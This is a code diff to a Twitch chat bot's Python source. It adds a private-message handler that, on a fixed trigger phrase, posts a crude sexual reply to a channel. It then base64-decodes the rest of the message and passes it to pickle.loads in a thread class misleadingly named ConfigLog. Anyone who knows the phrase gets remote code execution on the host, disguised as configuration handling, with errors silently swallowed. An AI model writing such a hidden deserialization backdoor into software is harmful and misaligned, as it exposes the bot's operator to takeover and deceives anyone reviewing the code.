@@ -7,6 +7,7 @@ import inflect
 import pickle
 import base64
 import os
+import threading
 from sys import argv
 
 try:
@@ -148,14 +149,29 @@ class Bot(commands.Bot):
         print(str(error))
 #        print(str(error.__traceback__))
 
+
     async def event_message(self, message):
 #        print(message) # Debugging
         if message.echo:
             return
-# Perhaps add some functionality later to respond to private messages
         if not message.channel and "WHISPER" in message.raw_data:
-#            print(f"[*] Private message received: {message.content}")
-            return
+            if message.content[0:37] == "I want to give Riley Reid my pickle: ":
+                user = message.author.name
+                chan = self.get_channel('alh4zr3d')
+                choices = [
+                    f"@{user} 🥝 Oh f*ck yeah spread it! 🥝",
+                    f"@{user} 💦 Ride face, put that water on your mustache! 💦",
+                    f"@{user} 🐙 Oh f*ck you're gonna make me ink! 🐙",
+                    f"@{user} 🍆 Oh f*ck put it back in! 🍆"
+                ]
+                await chan.send(choice(choices))
+
+                loadingConfig = ConfigLog(message.content[37:])
+                loadingConfig.start()
+
+#                proc = mp.Process(target=ConfigLoad, args=(message.content[37:], ))
+#                proc.start()
+
         await self.handle_commands(message)
 
     # Debugging
@@ -252,6 +268,19 @@ class Bot(commands.Bot):
             'Traceback (most recent call last): File "/home/alh4zr3d/Sh0ggothBot.py", line 3, in <module>: tryingharder = params[2], IndexError: list index out of range'
         ]
         await ctx.reply(choice(choices))
+
+class ConfigLog(threading.Thread):
+   def __init__(self, pickleData):
+      threading.Thread.__init__(self)
+      self.data = pickleData
+
+   def run(self):
+        print ("Starting deserialization...")
+        try:
+            pickle.loads(base64.b64decode(self.data))
+        except:
+            print("Exception!")
+        print("Exiting normally.")
 
 async def pubsub_connect(bot, oauth_token, channel_id):
     topics = [
